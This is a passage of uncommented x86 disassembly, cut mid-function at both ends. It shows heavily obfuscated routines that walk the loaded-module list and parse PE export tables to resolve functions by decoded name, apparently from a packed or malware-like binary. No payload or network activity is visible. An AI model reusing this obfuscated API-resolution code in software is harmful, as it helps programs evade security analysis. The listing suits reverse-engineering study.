  41d10e:	mov    edi,DWORD PTR [ebp-0x20]
  41d111:	mov    bx,WORD PTR [ebp-0x4]
  41d115:	xor    edi,esi
  41d117:	add    edi,eax
  41d119:	cmp    bx,di
  41d11c:	jb     0x41d13c
  41d11e:	mov    edi,DWORD PTR [ebp-0x2c]
  41d121:	mov    bx,WORD PTR [ebp-0x4]
  41d125:	xor    edi,esi
  41d127:	add    edi,eax
  41d129:	cmp    bx,di
  41d12c:	ja     0x41d13c
  41d12e:	movzx  edi,WORD PTR [ebp-0x4]
  41d132:	movzx  ebx,WORD PTR [ebp-0x8]
  41d136:	add    edi,ebx
  41d138:	mov    WORD PTR [ebp-0x4],di
  41d13c:	mov    di,WORD PTR [ebp-0x4]
  41d140:	mov    bx,WORD PTR [ebp+0x8]
  41d144:	cmp    bx,di
  41d147:	jne    0x41d241
  41d14d:	mov    edi,DWORD PTR [ebp-0x1c]
  41d150:	mov    ebx,DWORD PTR [ebp-0x10]
  41d153:	xor    edi,ecx
  41d155:	lea    edi,[edi+ebx*1+0x3272e0]
  41d15c:	mov    DWORD PTR [ebp-0x10],edi
  41d15f:	mov    edi,DWORD PTR [ebp-0x1c]
  41d162:	mov    ebx,DWORD PTR [ebp-0x14]
  41d165:	xor    edi,ecx
  41d167:	lea    edi,[edi+ebx*1+0x3272e0]
  41d16e:	mov    DWORD PTR [ebp-0x14],edi
  41d171:	mov    edi,DWORD PTR [ebp-0x24]
  41d174:	mov    ebx,DWORD PTR [ebp-0x10]
  41d177:	mov    di,WORD PTR [ebx+edi*2]
  41d17b:	mov    WORD PTR [ebp+0x8],di
  41d17f:	mov    edi,DWORD PTR [ebp-0x28]
  41d182:	mov    ebx,DWORD PTR [ebp-0x14]
  41d185:	mov    di,WORD PTR [ebx+edi*2]
  41d189:	mov    WORD PTR [ebp-0x4],di
  41d18d:	mov    edi,DWORD PTR [ebp-0xc]
  41d190:	mov    bx,WORD PTR [ebp+0x8]
  41d194:	xor    edi,esi
  41d196:	add    edi,eax
  41d198:	cmp    bx,di
  41d19b:	jne    0x41d0b1
  41d1a1:	mov    eax,DWORD PTR [ebp-0x18]
  41d1a4:	mov    esi,DWORD PTR [ebp-0xc]
  41d1a7:	xor    eax,ecx
  41d1a9:	add    eax,edx
  41d1ab:	imul   eax,esi
  41d1ae:	mov    DWORD PTR [ebp-0xc],eax
  41d1b1:	jmp    0x41d1c5
  41d1b3:	mov    eax,DWORD PTR [ebp-0xc]
  41d1b6:	mov    esi,DWORD PTR [ebp-0x18]
  41d1b9:	xor    eax,ecx
  41d1bb:	lea    eax,[eax+esi*1+0x3272e0]
  41d1c2:	mov    DWORD PTR [ebp-0x18],eax
  41d1c5:	mov    eax,DWORD PTR [ebp-0x24]
  41d1c8:	sub    eax,edx
  41d1ca:	xor    eax,ecx
  41d1cc:	mov    DWORD PTR [ebp-0x30],eax
  41d1cf:	mov    eax,DWORD PTR [ebp-0x28]
  41d1d2:	sub    eax,edx
  41d1d4:	xor    eax,ecx
  41d1d6:	mov    DWORD PTR [ebp-0x34],eax
  41d1d9:	mov    eax,DWORD PTR [ebp-0x34]
  41d1dc:	mov    esi,DWORD PTR [ebp-0x1c]
  41d1df:	xor    esi,ecx
  41d1e1:	add    esi,edx
  41d1e3:	xor    eax,ecx
  41d1e5:	add    eax,0x3272e0
  41d1ea:	imul   esi,eax
  41d1ed:	mov    eax,DWORD PTR [ebp-0x14]
  41d1f0:	movzx  eax,WORD PTR [esi+eax*1]
  41d1f4:	mov    esi,DWORD PTR [ebp-0x30]
  41d1f7:	mov    edi,DWORD PTR [ebp-0x1c]
  41d1fa:	xor    esi,ecx
  41d1fc:	add    esi,edx
  41d1fe:	xor    edi,ecx
  41d200:	add    edi,edx
  41d202:	imul   edi,esi
  41d205:	mov    esi,DWORD PTR [ebp-0x10]
  41d208:	movzx  esi,WORD PTR [edi+esi*1]
  41d20c:	sub    eax,edx
  41d20e:	sub    esi,edx
  41d210:	xor    eax,ecx
  41d212:	xor    esi,ecx
  41d214:	cmp    esi,eax
  41d216:	jne    0x41d241
  41d218:	mov    eax,DWORD PTR [ebp-0x30]
  41d21b:	mov    esi,DWORD PTR [ebp-0x1c]
  41d21e:	xor    eax,ecx
  41d220:	add    eax,0x3272e0
  41d225:	xor    esi,ecx
  41d227:	add    esi,edx
  41d229:	imul   esi,eax
  41d22c:	mov    eax,DWORD PTR [ebp-0x10]
  41d22f:	movzx  eax,WORD PTR [esi+eax*1]
  41d233:	mov    esi,DWORD PTR [ebp-0xc]
  41d236:	sub    eax,edx
  41d238:	xor    eax,ecx
  41d23a:	cmp    eax,esi
  41d23c:	mov    eax,DWORD PTR [ebp-0xc]
  41d23f:	je     0x41d244
  41d241:	mov    eax,DWORD PTR [ebp-0x18]
  41d244:	pop    edi
  41d245:	xor    eax,ecx
  41d247:	pop    esi
  41d248:	add    eax,edx
  41d24a:	pop    ebx
  41d24b:	leave  
  41d24c:	ret    0x8
  41d24f:	push   ebp
  41d250:	mov    ebp,esp
  41d252:	push   ecx
  41d253:	mov    cx,WORD PTR [eax]
  41d256:	push   esi
  41d257:	mov    esi,0x3b50
  41d25c:	sub    cx,si
  41d25f:	mov    esi,0x8a8c
  41d264:	xor    cx,si
  41d267:	mov    esi,0x4e3c
  41d26c:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41d273:	mov    edx,0xf89c85b9
  41d278:	cmp    cx,si
  41d27b:	je     0x41d2da
  41d27d:	push   ebx
  41d27e:	push   edi
  41d27f:	movzx  ecx,cx
  41d282:	mov    edi,0xffcd8d20
  41d287:	mov    esi,0x7510899
  41d28c:	mov    ebx,0x4f80
  41d291:	cmp    cx,bx
  41d294:	jne    0x41d299
  41d296:	mov    DWORD PTR [ebp-0x4],edx
  41d299:	lea    edx,[edi+0x1]
  41d29c:	xor    edx,esi
  41d29e:	mov    edi,edx
  41d2a0:	xor    edi,esi
  41d2a2:	mov    cx,WORD PTR [eax+edi*2+0x64e5c0]
  41d2aa:	mov    ebx,0x3b50
  41d2af:	sub    cx,bx
  41d2b2:	mov    ebx,0x8a8c
  41d2b7:	xor    cx,bx
  41d2ba:	mov    ebx,0x4e3c
  41d2bf:	cmp    cx,bx
  41d2c2:	jne    0x41d28c
  41d2c4:	mov    ecx,DWORD PTR [ebp-0x4]
  41d2c7:	pop    edi
  41d2c8:	pop    ebx
  41d2c9:	cmp    ecx,0xf89c8586
  41d2cf:	je     0x41d2da
  41d2d1:	xor    ecx,esi
  41d2d3:	lea    eax,[eax+ecx*2+0x64e5c2]
  41d2da:	pop    esi
  41d2db:	leave  
  41d2dc:	ret    
  41d2dd:	push   ebp
  41d2de:	mov    ebp,esp
  41d2e0:	push   ecx
  41d2e1:	push   esi
  41d2e2:	push   edi
  41d2e3:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41d2ea:	mov    esi,0xf89c85b9
  41d2ef:	call   0x41d24f
  41d2f4:	mov    edi,eax
  41d2f6:	mov    al,BYTE PTR [edi]
  41d2f8:	add    al,0x9
  41d2fa:	xor    al,0x73
  41d2fc:	cmp    al,0x7a
  41d2fe:	je     0x41d361
  41d300:	mov    eax,edi
  41d302:	mov    edx,0xffcd8d20
  41d307:	mov    ecx,0x7510899
  41d30c:	push   ebx
  41d30d:	mov    ax,WORD PTR [eax]
  41d310:	mov    ebx,0x3b50
  41d315:	sub    ax,bx
  41d318:	mov    ebx,0x8a8c
  41d31d:	xor    ax,bx
  41d320:	mov    ebx,0x4e52
  41d325:	cmp    ax,bx
  41d328:	jne    0x41d32d
  41d32a:	mov    DWORD PTR [ebp-0x4],esi
  41d32d:	lea    esi,[edx+0x1]
  41d330:	xor    esi,ecx
  41d332:	mov    edx,esi
  41d334:	xor    edx,ecx
  41d336:	lea    eax,[edi+edx*2+0x64e5c0]
  41d33d:	mov    bl,BYTE PTR [eax]
  41d33f:	add    bl,0x9
  41d342:	xor    bl,0x73
  41d345:	cmp    bl,0x7a
  41d348:	jne    0x41d30d
  41d34a:	mov    eax,DWORD PTR [ebp-0x4]
  41d34d:	pop    ebx
  41d34e:	cmp    eax,0xf89c8586
  41d353:	je     0x41d361
  41d355:	xor    eax,ecx
  41d357:	xor    ecx,ecx
  41d359:	mov    WORD PTR [edi+eax*2+0x64e5c0],cx
  41d361:	mov    eax,edi
  41d363:	pop    edi
  41d364:	pop    esi
  41d365:	leave  
  41d366:	ret    
  41d367:	push   ebp
  41d368:	mov    ebp,esp
  41d36a:	push   ecx
  41d36b:	push   esi
  41d36c:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41d373:	mov    esi,0xf89c85b9
  41d378:	call   0x41d24f
  41d37d:	mov    cx,WORD PTR [eax]
  41d380:	mov    edx,0x3b50
  41d385:	sub    cx,dx
  41d388:	mov    edx,0x8a8c
  41d38d:	xor    cx,dx
  41d390:	mov    edx,0x4e3c
  41d395:	cmp    cx,dx
  41d398:	je     0x41d3f1
  41d39a:	push   ebx
  41d39b:	push   edi
  41d39c:	movzx  ecx,cx
  41d39f:	mov    edx,0xffcd8d20
  41d3a4:	mov    edi,0x7510899
  41d3a9:	mov    ebx,0x4e52
  41d3ae:	cmp    cx,bx
  41d3b1:	jne    0x41d3b6
  41d3b3:	mov    DWORD PTR [ebp-0x4],esi
  41d3b6:	lea    esi,[edx+0x1]
  41d3b9:	xor    esi,edi
  41d3bb:	mov    edx,esi
  41d3bd:	xor    edx,edi
  41d3bf:	mov    cx,WORD PTR [eax+edx*2+0x64e5c0]
  41d3c7:	mov    ebx,0x3b50
  41d3cc:	sub    cx,bx
  41d3cf:	mov    ebx,0x8a8c
  41d3d4:	xor    cx,bx
  41d3d7:	mov    ebx,0x4e3c
  41d3dc:	cmp    cx,bx
  41d3df:	jne    0x41d3a9
  41d3e1:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  41d3e8:	pop    edi
  41d3e9:	pop    ebx
  41d3ea:	je     0x41d3f1
  41d3ec:	xor    eax,eax
  41d3ee:	inc    eax
  41d3ef:	jmp    0x41d3f3
  41d3f1:	xor    eax,eax
  41d3f3:	pop    esi
  41d3f4:	leave  
  41d3f5:	ret    
  41d3f6:	push   ebp
  41d3f7:	mov    ebp,esp
  41d3f9:	push   ecx
  41d3fa:	mov    eax,DWORD PTR [ebp+0x8]
  41d3fd:	movzx  ecx,WORD PTR [eax]
  41d400:	push   esi
  41d401:	lea    eax,[ecx-0x3b50]
  41d407:	mov    esi,0x8a8c
  41d40c:	push   edi
  41d40d:	xor    eax,esi
  41d40f:	mov    edi,0x4e3c
  41d414:	mov    DWORD PTR [ebp-0x4],edx
  41d417:	cmp    ax,di
  41d41a:	je     0x41d447
  41d41c:	mov    eax,DWORD PTR [ebp+0x8]
  41d41f:	sub    eax,edx
  41d421:	mov    DWORD PTR [ebp+0x8],eax
  41d424:	jmp    0x41d429
  41d426:	mov    eax,DWORD PTR [ebp+0x8]
  41d429:	mov    WORD PTR [edx],cx
  41d42c:	add    edx,0x2
  41d42f:	movzx  edi,WORD PTR [eax+edx*1]
  41d433:	mov    ecx,edi
  41d435:	add    edi,0xffffc4b0
  41d43b:	xor    edi,esi
  41d43d:	mov    eax,0x4e3c
  41d442:	cmp    di,ax
  41d445:	jne    0x41d426
  41d447:	xor    eax,eax
  41d449:	pop    edi
  41d44a:	mov    WORD PTR [edx],ax
  41d44d:	mov    eax,DWORD PTR [ebp-0x4]
  41d450:	pop    esi
  41d451:	leave  
  41d452:	ret    0x4
  41d455:	push   ebp
  41d456:	mov    ebp,esp
  41d458:	sub    esp,0x18
  41d45b:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  41d462:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  41d469:	mov    eax,DWORD PTR [ebp-0x14]
  41d46c:	xor    eax,0x7510899
  41d471:	add    eax,0x3272e0
  41d476:	mov    DWORD PTR [ebp-0x8],eax
  41d479:	mov    DWORD PTR [ebp-0x10],0xf89c85b1
  41d480:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  41d487:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  41d48e:	mov    eax,DWORD PTR [ebp-0x14]
  41d491:	xor    eax,0x7510899
  41d496:	mov    ecx,DWORD PTR [ebp-0x8]
  41d499:	lea    eax,[ecx+eax*1+0x3272e0]
  41d4a0:	mov    ecx,DWORD PTR [ebp-0x18]
  41d4a3:	xor    ecx,0x7510899
  41d4a9:	add    ecx,0x3272e0
  41d4af:	mov    edx,DWORD PTR [ebp+0x10]
  41d4b2:	imul   edx,ecx
  41d4b5:	cmp    eax,edx
  41d4b7:	jae    0x41d5aa
  41d4bd:	mov    eax,DWORD PTR [ebp+0x10]
  41d4c0:	mov    ecx,DWORD PTR [ebp-0x8]
  41d4c3:	sub    eax,ecx
  41d4c5:	mov    ecx,DWORD PTR [ebp-0x10]
  41d4c8:	xor    ecx,0x7510899
  41d4ce:	add    ecx,0x3272e0
  41d4d4:	cmp    eax,ecx
  41d4d6:	jbe    0x41d508
  41d4d8:	mov    eax,DWORD PTR [ebp+0x8]
  41d4db:	add    eax,DWORD PTR [ebp-0x8]
  41d4de:	mov    ecx,DWORD PTR [ebp+0xc]
  41d4e1:	add    ecx,DWORD PTR [ebp-0x8]
  41d4e4:	mov    edx,DWORD PTR [ecx]
  41d4e6:	mov    DWORD PTR [eax],edx
  41d4e8:	mov    ecx,DWORD PTR [ecx+0x4]
  41d4eb:	mov    DWORD PTR [eax+0x4],ecx
  41d4ee:	mov    eax,DWORD PTR [ebp-0x10]
  41d4f1:	xor    eax,0x7510899
  41d4f6:	mov    ecx,DWORD PTR [ebp-0x8]
  41d4f9:	lea    eax,[ecx+eax*1+0x3272e0]
  41d500:	mov    DWORD PTR [ebp-0x8],eax
  41d503:	jmp    0x41d5a5
  41d508:	mov    eax,DWORD PTR [ebp+0x10]
  41d50b:	mov    ecx,DWORD PTR [ebp-0x8]
  41d50e:	sub    eax,ecx
  41d510:	mov    ecx,DWORD PTR [ebp-0xc]
  41d513:	xor    ecx,0x7510899
  41d519:	add    ecx,0x3272e0
  41d51f:	cmp    eax,ecx
  41d521:	jbe    0x41d54a
  41d523:	mov    eax,DWORD PTR [ebp+0x8]
  41d526:	add    eax,DWORD PTR [ebp-0x8]
  41d529:	mov    ecx,DWORD PTR [ebp+0xc]
  41d52c:	add    ecx,DWORD PTR [ebp-0x8]
  41d52f:	mov    ecx,DWORD PTR [ecx]
  41d531:	mov    DWORD PTR [eax],ecx
  41d533:	mov    eax,DWORD PTR [ebp-0xc]
  41d536:	xor    eax,0x7510899
  41d53b:	mov    ecx,DWORD PTR [ebp-0x8]
  41d53e:	lea    eax,[ecx+eax*1+0x3272e0]
  41d545:	mov    DWORD PTR [ebp-0x8],eax
  41d548:	jmp    0x41d5a5
  41d54a:	mov    eax,DWORD PTR [ebp+0x10]
  41d54d:	mov    ecx,DWORD PTR [ebp-0x8]
  41d550:	sub    eax,ecx
  41d552:	mov    ecx,DWORD PTR [ebp-0x4]
  41d555:	xor    ecx,0x7510899
  41d55b:	add    ecx,0x3272e0
  41d561:	cmp    eax,ecx
  41d563:	jbe    0x41d58e
  41d565:	mov    eax,DWORD PTR [ebp+0x8]
  41d568:	add    eax,DWORD PTR [ebp-0x8]
  41d56b:	mov    ecx,DWORD PTR [ebp+0xc]
  41d56e:	add    ecx,DWORD PTR [ebp-0x8]
  41d571:	mov    cx,WORD PTR [ecx]
  41d574:	mov    WORD PTR [eax],cx
  41d577:	mov    eax,DWORD PTR [ebp-0x4]
  41d57a:	xor    eax,0x7510899
  41d57f:	mov    ecx,DWORD PTR [ebp-0x8]
  41d582:	lea    eax,[ecx+eax*1+0x3272e0]
  41d589:	mov    DWORD PTR [ebp-0x8],eax
  41d58c:	jmp    0x41d5a5
  41d58e:	mov    eax,DWORD PTR [ebp+0x8]
  41d591:	add    eax,DWORD PTR [ebp-0x8]
  41d594:	mov    ecx,DWORD PTR [ebp+0xc]
  41d597:	add    ecx,DWORD PTR [ebp-0x8]
  41d59a:	mov    cl,BYTE PTR [ecx]
  41d59c:	mov    BYTE PTR [eax],cl
  41d59e:	mov    eax,DWORD PTR [ebp-0x8]
  41d5a1:	inc    eax
  41d5a2:	mov    DWORD PTR [ebp-0x8],eax
  41d5a5:	jmp    0x41d48e
  41d5aa:	leave  
  41d5ab:	ret    0xc
  41d5ae:	push   ebp
  41d5af:	mov    ebp,esp
  41d5b1:	sub    esp,0xc
  41d5b4:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  41d5bb:	push   esi
  41d5bc:	mov    esi,eax
  41d5be:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41d5c5:	mov    edx,DWORD PTR [ebp-0x4]
  41d5c8:	mov    eax,0x7510899
  41d5cd:	xor    edx,eax
  41d5cf:	mov    ecx,0x3272e0
  41d5d4:	add    edx,ecx
  41d5d6:	cmp    esi,edx
  41d5d8:	je     0x41d61a
  41d5da:	push   ebx
  41d5db:	push   edi
  41d5dc:	mov    edx,DWORD PTR [ebp-0x8]
  41d5df:	mov    ebx,DWORD PTR [ebp+0x8]
  41d5e2:	xor    edx,eax
  41d5e4:	mov    edi,0xffcd8d20
  41d5e9:	sub    edi,edx
  41d5eb:	add    esi,edi
  41d5ed:	lea    edx,[esi-0x3272e0]
  41d5f3:	xor    edx,eax
  41d5f5:	mov    DWORD PTR [ebp-0xc],edx
  41d5f8:	mov    edx,DWORD PTR [ebp-0x4]
  41d5fb:	mov    edi,DWORD PTR [ebp-0xc]
  41d5fe:	xor    dl,0x99
  41d601:	sub    dl,0x20
  41d604:	xor    edi,eax
  41d606:	mov    BYTE PTR [edi+ebx*1+0x3272e0],dl
  41d60d:	mov    edx,DWORD PTR [ebp-0x4]
  41d610:	xor    edx,eax
  41d612:	add    edx,ecx
  41d614:	cmp    esi,edx
  41d616:	jne    0x41d5dc
  41d618:	pop    edi
  41d619:	pop    ebx
  41d61a:	pop    esi
  41d61b:	leave  
  41d61c:	ret    0x4
  41d61f:	push   ebp
  41d620:	mov    ebp,esp
  41d622:	sub    esp,0x21c
  41d628:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  41d62f:	mov    DWORD PTR [ebp-0x14],0xf89c85b8
  41d636:	mov    eax,DWORD PTR [ebp+0x10]
  41d639:	mov    eax,DWORD PTR [ebp-0x4]
  41d63c:	mov    ecx,DWORD PTR [ebp+0x8]
  41d63f:	push   esi
  41d640:	push   edi
  41d641:	mov    edi,0x7510899
  41d646:	xor    eax,edi
  41d648:	mov    esi,0x3272e0
  41d64d:	add    eax,esi
  41d64f:	cmp    eax,ecx
  41d651:	mov    eax,DWORD PTR [ebp-0x4]
  41d654:	jne    0x41d65f
  41d656:	xor    eax,edi
  41d658:	add    eax,esi
  41d65a:	jmp    0x41d70b
  41d65f:	mov    ecx,DWORD PTR [ebp+0xc]
  41d662:	xor    eax,edi
  41d664:	add    eax,esi
  41d666:	cmp    eax,ecx
  41d668:	jne    0x41d66f
  41d66a:	mov    eax,DWORD PTR [ebp-0x4]
  41d66d:	jmp    0x41d656
  41d66f:	lea    eax,[ebp-0x21c]
  41d675:	mov    DWORD PTR [ebp-0x8],eax
  41d678:	mov    eax,DWORD PTR [ebp+0xc]
  41d67b:	mov    DWORD PTR [ebp-0x10],eax
  41d67e:	mov    eax,DWORD PTR [ebp-0x4]
  41d681:	xor    eax,edi
  41d683:	add    eax,esi
  41d685:	mov    DWORD PTR [ebp+0x10],eax
  41d688:	mov    eax,DWORD PTR [ebp+0xc]
  41d68b:	push   ebx
  41d68c:	call   0x41d367
  41d691:	mov    ebx,eax
  41d693:	mov    eax,DWORD PTR [ebp+0x8]
  41d696:	mov    eax,DWORD PTR [eax+0x14]
  41d699:	jmp    0x41d6f3
  41d69b:	mov    eax,DWORD PTR [ebp+0xc]
  41d69e:	sub    eax,0x8
  41d6a1:	mov    DWORD PTR [ebp-0xc],eax
  41d6a4:	mov    eax,DWORD PTR [ebp-0xc]
  41d6a7:	mov    eax,DWORD PTR [eax+0x28]
  41d6aa:	call   0x41d24f
  41d6af:	mov    DWORD PTR [ebp+0x10],eax
  41d6b2:	push   DWORD PTR [ebp+0x10]
  41d6b5:	mov    edx,DWORD PTR [ebp-0x8]
  41d6b8:	call   0x41d3f6
  41d6bd:	mov    eax,DWORD PTR [ebp-0x4]
  41d6c0:	xor    eax,edi
  41d6c2:	add    eax,esi
  41d6c4:	cmp    eax,ebx
  41d6c6:	jne    0x41d6d0
  41d6c8:	mov    eax,DWORD PTR [ebp-0x8]
  41d6cb:	call   0x41d2dd
  41d6d0:	mov    eax,DWORD PTR [ebp-0x14]
  41d6d3:	xor    eax,edi
  41d6d5:	add    eax,esi
  41d6d7:	push   eax
  41d6d8:	push   DWORD PTR [ebp-0x10]
  41d6db:	mov    eax,DWORD PTR [ebp-0x8]
  41d6de:	call   0x41d009
  41d6e3:	mov    ecx,DWORD PTR [ebp-0x4]
  41d6e6:	xor    ecx,edi
  41d6e8:	add    ecx,esi
  41d6ea:	cmp    eax,ecx
  41d6ec:	je     0x41d711
  41d6ee:	mov    eax,DWORD PTR [ebp+0xc]
  41d6f1:	mov    eax,DWORD PTR [eax]
  41d6f3:	mov    DWORD PTR [ebp+0xc],eax
  41d6f6:	mov    eax,DWORD PTR [ebp+0x8]
  41d6f9:	mov    ecx,DWORD PTR [ebp+0xc]
  41d6fc:	add    eax,0x14
  41d6ff:	cmp    ecx,eax
  41d701:	jne    0x41d69b
  41d703:	mov    eax,DWORD PTR [ebp-0x4]
  41d706:	xor    eax,edi
  41d708:	add    eax,esi
  41d70a:	pop    ebx
  41d70b:	pop    edi
  41d70c:	pop    esi
  41d70d:	leave  
  41d70e:	ret    0xc
  41d711:	mov    eax,DWORD PTR [ebp-0xc]
  41d714:	mov    eax,DWORD PTR [eax+0x18]
  41d717:	jmp    0x41d70a
  41d719:	push   ebp
  41d71a:	mov    ebp,esp
  41d71c:	mov    eax,DWORD PTR [ebp+0xc]
  41d71f:	sub    esp,0x10
  41d722:	cmp    DWORD PTR [ebp+0x8],0x0
  41d726:	push   ebx
  41d727:	push   esi
  41d728:	push   edi
  41d729:	je     0x41d7de
  41d72f:	test   eax,eax
  41d731:	je     0x41d7de
  41d737:	movzx  eax,WORD PTR [eax+0x20]
  41d73b:	mov    ecx,eax
  41d73d:	mov    DWORD PTR [ebp-0x10],eax
  41d740:	xor    edx,edx
  41d742:	and    DWORD PTR [ebp-0x8],edx
  41d745:	mov    eax,0x8a8c
  41d74a:	xor    ecx,eax
  41d74c:	add    ecx,0x3b50
  41d752:	mov    DWORD PTR [ebp-0xc],ecx
  41d755:	and    DWORD PTR [ebp-0x4],0x0
  41d759:	xor    ecx,ecx
  41d75b:	push   0x78
  41d75d:	pop    edi
  41d75e:	cmp    cx,WORD PTR [ebp-0xc]
  41d762:	jae    0x41d7c8
  41d764:	lea    esi,[edx-0x3b50]
  41d76a:	xor    esi,eax
  41d76c:	movzx  ecx,WORD PTR [ebp-0x4]
  41d770:	mov    ebx,DWORD PTR [ebp+0xc]
  41d773:	lea    ecx,[ebx+ecx*4]
  41d776:	cmp    WORD PTR [ecx+0x2],si
  41d77a:	jne    0x41d7b3
  41d77c:	movzx  ecx,WORD PTR [ecx]
  41d77f:	mov    edi,0x4e3c
  41d784:	cmp    cx,di
  41d787:	jne    0x41d795
  41d789:	mov    ebx,DWORD PTR [ebp+0x8]
  41d78c:	movzx  edi,dx
  41d78f:	cmp    BYTE PTR [edi+ebx*1],0x0
  41d793:	je     0x41d7c2
  41d795:	mov    ebx,DWORD PTR [ebp+0x8]
  41d798:	movzx  edi,dx
  41d79b:	movsx  di,BYTE PTR [edi+ebx*1]
  41d7a0:	mov    ebx,0x3b50
  41d7a5:	sub    di,bx
  41d7a8:	xor    di,ax
  41d7ab:	cmp    cx,di
  41d7ae:	je     0x41d7c2
  41d7b0:	push   0x7a
  41d7b2:	pop    edi
  41d7b3:	inc    DWORD PTR [ebp-0x4]
  41d7b6:	mov    cx,WORD PTR [ebp-0xc]
  41d7ba:	cmp    WORD PTR [ebp-0x4],cx
  41d7be:	jb     0x41d76c
  41d7c0:	jmp    0x41d7c8
  41d7c2:	inc    DWORD PTR [ebp-0x8]
  41d7c5:	push   0x79
  41d7c7:	pop    edi
  41d7c8:	mov    esi,DWORD PTR [ebp+0x8]
  41d7cb:	movzx  ecx,dx
  41d7ce:	cmp    BYTE PTR [ecx+esi*1],0x0
  41d7d2:	je     0x41d7e7
  41d7d4:	inc    edx
  41d7d5:	cmp    edi,0x7a
  41d7d8:	jne    0x41d755
  41d7de:	xor    eax,eax
  41d7e0:	pop    edi
  41d7e1:	pop    esi
  41d7e2:	pop    ebx
  41d7e3:	leave  
  41d7e4:	ret    0x8
  41d7e7:	mov    ecx,DWORD PTR [ebp-0x8]
  41d7ea:	add    ecx,0xffffc4b0
  41d7f0:	xor    cx,ax
  41d7f3:	xor    eax,eax
  41d7f5:	cmp    cx,WORD PTR [ebp-0x10]
  41d7f9:	sete   al
  41d7fc:	jmp    0x41d7e0
  41d7fe:	push   ebp
  41d7ff:	mov    ebp,esp
  41d801:	sub    esp,0x50
  41d804:	push   edi
  41d805:	mov    edi,eax
  41d807:	mov    eax,DWORD PTR [edi+0x1a8]
  41d80d:	cmp    DWORD PTR [eax],0x0
  41d810:	jne    0x41d819
  41d812:	xor    eax,eax
  41d814:	jmp    0x41d94a
  41d819:	push   DWORD PTR [ebp+0x8]
  41d81c:	push   0x2c
  41d81e:	pop    eax
  41d81f:	call   0x41d5ae
  41d824:	mov    edx,DWORD PTR [edi+0x1ac]
  41d82a:	lea    eax,[edi+0x22]
  41d82d:	mov    DWORD PTR [ebp-0x4c],eax
  41d830:	lea    eax,[edi+0x44]
  41d833:	mov    DWORD PTR [ebp-0x48],eax
  41d836:	lea    eax,[edi+0x66]
  41d839:	mov    DWORD PTR [ebp-0x44],eax
  41d83c:	lea    eax,[edi+0x88]
  41d842:	mov    DWORD PTR [ebp-0x40],eax
  41d845:	lea    eax,[edi+0xaa]
  41d84b:	mov    DWORD PTR [ebp-0x3c],eax
  41d84e:	lea    eax,[edi+0xcc]
  41d854:	mov    DWORD PTR [ebp-0x38],eax
  41d857:	lea    eax,[edi+0xee]
  41d85d:	mov    DWORD PTR [ebp-0x34],eax
  41d860:	lea    eax,[edi+0x110]
  41d866:	mov    DWORD PTR [ebp-0x30],eax
  41d869:	lea    eax,[edi+0x132]
  41d86f:	mov    DWORD PTR [ebp-0x2c],eax
  41d872:	lea    eax,[edi+0x154]
  41d878:	push   edi
  41d879:	mov    DWORD PTR [ebp-0x50],edi
  41d87c:	mov    DWORD PTR [ebp-0x28],eax
  41d87f:	call   0x41d97e
  41d884:	push   eax
  41d885:	mov    eax,DWORD PTR [edi+0x1a8]
  41d88b:	push   DWORD PTR [eax]
  41d88d:	call   0x41d61f
  41d892:	mov    DWORD PTR [ebp-0x10],eax
  41d895:	test   eax,eax
  41d897:	je     0x41d94a
  41d89d:	mov    ecx,DWORD PTR [eax+0x3c]
  41d8a0:	push   ebx
  41d8a1:	push   esi
  41d8a2:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41d8a6:	add    esi,eax
  41d8a8:	mov    edi,DWORD PTR [esi+0x24]
  41d8ab:	mov    ecx,DWORD PTR [esi+0x1c]
  41d8ae:	mov    edx,DWORD PTR [esi+0x20]
  41d8b1:	mov    ebx,DWORD PTR [esi+0x18]
  41d8b4:	add    edi,eax
  41d8b6:	mov    DWORD PTR [ebp-0x20],edi
  41d8b9:	mov    edi,DWORD PTR [esi+0x14]
  41d8bc:	add    ecx,eax
  41d8be:	add    edx,eax
  41d8c0:	mov    DWORD PTR [ebp-0xc],ecx
  41d8c3:	mov    DWORD PTR [ebp-0x1c],edx
  41d8c6:	mov    DWORD PTR [ebp-0x8],edi
  41d8c9:	cmp    edi,ebx
  41d8cb:	ja     0x41d8d0
  41d8cd:	mov    DWORD PTR [ebp-0x8],ebx
  41d8d0:	xor    ebx,ebx
  41d8d2:	mov    DWORD PTR [ebp-0x18],ebx
  41d8d5:	cmp    DWORD PTR [ebp-0x8],ebx
  41d8d8:	jbe    0x41d948
  41d8da:	jmp    0x41d8df
  41d8dc:	mov    edx,DWORD PTR [ebp-0x1c]
  41d8df:	mov    edi,DWORD PTR [ebp-0x20]
  41d8e2:	movzx  edi,WORD PTR [edi+ebx*2]
  41d8e6:	cmp    ebx,DWORD PTR [esi+0x18]
  41d8e9:	jae    0x41d948
  41d8eb:	cmp    edi,DWORD PTR [esi+0x14]
  41d8ee:	jae    0x41d948
  41d8f0:	mov    ebx,DWORD PTR [edx+ebx*4]
  41d8f3:	mov    edx,DWORD PTR [ebp+0x8]
  41d8f6:	mov    edi,DWORD PTR [ecx+edi*4]
  41d8f9:	mov    DWORD PTR [ebp-0x4],edx
  41d8fc:	lea    edx,[ebp-0x50]
  41d8ff:	add    ebx,eax
  41d901:	add    edi,eax
  41d903:	sub    edx,DWORD PTR [ebp+0x8]
  41d906:	mov    DWORD PTR [ebp-0x14],0xb
  41d90d:	mov    DWORD PTR [ebp-0x24],edx
  41d910:	mov    edx,DWORD PTR [ebp-0x4]
  41d913:	cmp    DWORD PTR [edx],0x0
  41d916:	jne    0x41d933
  41d918:	mov    eax,DWORD PTR [ebp-0x24]
  41d91b:	push   DWORD PTR [eax+edx*1]
  41d91e:	push   ebx
  41d91f:	call   0x41d719
  41d924:	mov    ecx,DWORD PTR [ebp-0xc]
  41d927:	test   eax,eax
  41d929:	je     0x41d930
  41d92b:	mov    eax,DWORD PTR [ebp-0x4]
  41d92e:	mov    DWORD PTR [eax],edi
  41d930:	mov    eax,DWORD PTR [ebp-0x10]
  41d933:	add    DWORD PTR [ebp-0x4],0x4
